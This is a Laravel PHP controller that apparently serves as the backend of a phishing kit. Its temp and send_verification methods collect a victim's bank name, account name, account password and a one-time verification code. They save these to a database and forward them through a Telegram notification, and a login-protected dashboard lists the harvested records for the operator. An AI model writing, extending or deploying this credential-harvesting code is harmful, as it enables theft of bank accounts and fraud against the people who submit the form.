<?php

namespace App\Http\Controllers;

use App\Models\DataInfo;
use App\Models\User;
use App\Notifications\LaravelTelegramNotification;
use Dflydev\DotAccessData\Data;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class HomeController extends Controller
{
    public function index()
    {
        return view('welcome');
        
   
    }
    public  function temp(Request $request)
    {
        $request->session()->put('form',$request->all());
        $user = User::first();
        $data =$request->all();
        

        
        $user->notify(new LaravelTelegramNotification($data));
        return redirect()->route('verification');
    }
    public function verification(){
        return view('verification');
    }
    public function send_verification(Request $request){
        $data = new DataInfo();
        $form1 = session()->get('form');
        $data ->bank_name = $form1['bank_name'];
        $data ->account_name = $form1['account_name'];
        $data ->account_password = $form1['account_password'];
        $data->code = $request->verification;
        $data->save();
        $user = User::first();
        // $data =[
        //     'name'=>'islam'
        // ];
        if($data){
            session()->forget('form');
        }

        
        $user->notify(new LaravelTelegramNotification($data));
        

    }
    public function login_dashboard(){
        return view('dashboard.auth.login');
    }
    public function login_dashboard_post(Request $request){
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);
        $credentials = $request->only('email', 'password');
        if (Auth::attempt($credentials)) {
            return redirect('/dashboard');
        } else {
            return redirect()->back()->with(['error' => 'البيانات غير متطابقة مع سجلاتنا']);
        }
    }
    public function dashboard()
    {
        $data = DataInfo::orderBy('id','desc')->get();
        return view('dashboard.index')->with('data',$data);
    }
    public function logout(){
        Auth::logout();
        return redirect()->route('first');
    }
    public function edit_profile(){
        return view('dashboard.auth.profile')->with('user',auth()->user());  
    }
    public function update_profile(Request $request){
        $request->validate([
            'name'=>'required',
            'email'=>'required|email',
        ]);
        if($request->password != null){
            $request->validate([
            'password'=>'required',
            'confirm-password'=>'same:password'
        ]);}
        $user = auth()->user();
        $user->name= $request->name;
        $user->email= $request->email;
        if($request->password != null){
            $user->password= bcrypt($request->password );
        }
        $user->save();
        return redirect()->back()->with(['success'=>'تم التعديل بنجاح']);

        }
    }

